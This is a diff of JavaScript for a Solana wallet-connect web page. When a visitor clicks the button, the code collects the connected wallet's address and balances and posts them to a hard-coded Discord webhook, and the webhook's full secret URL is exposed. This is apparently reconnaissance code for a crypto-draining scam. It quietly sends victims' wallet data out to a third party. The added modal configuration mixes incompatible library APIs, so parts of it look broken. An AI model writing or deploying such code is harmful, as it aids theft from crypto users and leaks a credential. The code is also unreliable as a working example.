@@ -1,24 +1,7 @@
-import {
-  w3mConnectors,
-  w3mProvider,
-  WagmiCore,
-  WagmiCoreChains,
-  WagmiCoreConnectors
-} from "https://unpkg.com/@web3modal/ethereum@2.6.2";
-import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";
-
-// === Setup Ethereum ===
-const {
-  configureChains,
-  createConfig,
-  getAccount,
-  fetchBalance,
-  watchAccount
-} = WagmiCore;
-
 // === Import Solana Modules ===
 import "https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js";
 import "https://unpkg.com/@web3modal/solana@latest/dist/index.umd.js";
+import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";
 
 // === Solana Wallet Setup ===
 const solanaWallet = new window.Web3ModalSolana.SolanaWalletAdapter();
@@ -26,10 +9,23 @@ const solanaWallet = new window.Web3ModalSolana.SolanaWalletAdapter();
 // === Discord Webhook URL ===
 const webhookURL = "https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR";
 
+// === Web3Modal Setup ===
+const web3Modal = new Web3Modal({
+  cacheProvider: true, // Save the modal state
+  providerOptions: {
+    solana: {
+      package: window.Web3ModalSolana, // Solana connector package
+      connector: async () => new window.Web3ModalSolana.SolanaWalletAdapter(), // Solana wallet adapter
+    },
+  },
+});
+
 // === Connect Solana Wallet and Send Balance to Discord ===
 async function connectSolanaWallet() {
   try {
-    await solanaWallet.connect();
+    const provider = await web3Modal.connect(); // Open the modal and get the provider
+    await solanaWallet.connect(); // Connect to the Solana wallet
+
     const publicKey = solanaWallet.publicKey.toString();
     const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
     const balance = await connection.getBalance(solanaWallet.publicKey);
@@ -96,7 +92,3 @@ async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
 document.querySelector('w3m-core-button').addEventListener('click', () => {
   connectSolanaWallet();
 });
-
-
-// Optional: Trigger Solana connect (use this on a button click or page load)
-// connectSolanaWallet();
